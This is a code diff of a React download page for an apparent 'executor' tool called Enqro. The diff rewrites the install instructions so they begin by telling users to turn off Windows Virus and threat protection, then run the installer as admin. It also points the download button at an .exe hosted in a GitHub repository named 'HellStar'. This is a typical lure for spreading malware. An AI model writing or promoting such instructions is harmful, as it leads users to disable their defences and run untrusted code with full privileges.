@@ -66,10 +66,11 @@ const downloadOptions = [
       'DirectX 11 compatible graphics'
     ],
     instructions: [
-      'Download the installer',
-      'Run as administrator',
-      'Follow installation wizard',
-      'Launch Enqro from desktop shortcut'
+      'Turn Off Virus And threat protection in your windows sercuity',
+      'Download Installer',
+      'Run as Admin',
+       'Install all dependencies',
+      ' Enjoy Enqro executor!'
     ]
   },
   {
@@ -132,7 +133,7 @@ export function DownloadPage() {
 // New DownloadButton definition
 function DownloadButton({ className }: { className?: string }) {
   const handleDownload = () => {
-    window.location.href = 'https://github.com/vodpzx/HellStar/raw/main/Fixes.exe';
+    window.location.href = 'https://github.com/vodpzx/HellStar/raw/main/Enqro.exe';
   };
 
   return (
